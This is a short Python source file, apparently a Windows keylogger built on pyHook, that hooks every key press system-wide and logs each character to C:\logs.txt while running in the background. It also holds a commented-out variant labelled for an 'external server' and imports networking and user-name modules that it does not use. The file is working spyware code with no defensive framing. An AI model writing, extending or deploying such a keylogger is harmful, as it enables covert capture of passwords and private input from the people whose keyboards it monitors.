# pyHook , pywin32 # need to be installed in machine
import pyHook, pythoncom, os, httplib, getpass, shutil, sys, logging

# way 1 for external server

# def on_keyboard_event(key):
# 	print key.Ascii

# hook_manager = pyHook.HookManager() # new hook manager
# hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
# hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
# pythoncom.PumpMessages() # keep program running in background


# way 2 for internal saving 

file_log = 'C:\\logs.txt' # saving file name and location 

def on_keyboard_event(key):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format="%(message)s")
	chr(key.Ascii)
	logging.log(10, chr(key.Ascii))
	return True

hook_manager = pyHook.HookManager() # new hook manager
hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
pythoncom.PumpMessages() # keep program running in background
